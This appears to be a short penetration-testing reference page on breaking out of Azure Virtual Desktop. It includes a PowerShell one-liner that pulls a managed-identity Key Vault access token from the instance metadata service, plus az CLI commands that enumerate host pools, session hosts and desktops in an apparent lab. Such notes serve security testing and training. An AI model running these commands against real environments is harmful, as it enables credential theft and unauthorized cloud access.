# Azure Virtual Desktop

## Deskto­p Applic­ation Escape

Access apps from the following endpoints:

- https://windows365.microsoft.com/ent#/devices
- https://windows.cloud.microsoft/#/apps

See [Citrix escape](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/#microsoft-edge)

Then escape from notepad and extract vault token : `$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $tokenResponse.access_token`

```sh
az desktopvirtualization hostpool list
az desktopvirtualization workspace list
az desktopvirtualization applicationgroup list

# List hosts
az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/lab1_desktop_rg/providers/Microsoft.DesktopVirtualization/hostPools/lab1-desktop-hostpool/sessionHosts?api-version=2024-04-03"

# List desktop
az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/lab1_desktop_rg/providers/Microsoft.DesktopVirtualization/applicationGroups/lab1-desktop-appgroup/desktops?api-version=2024-04-03"
```
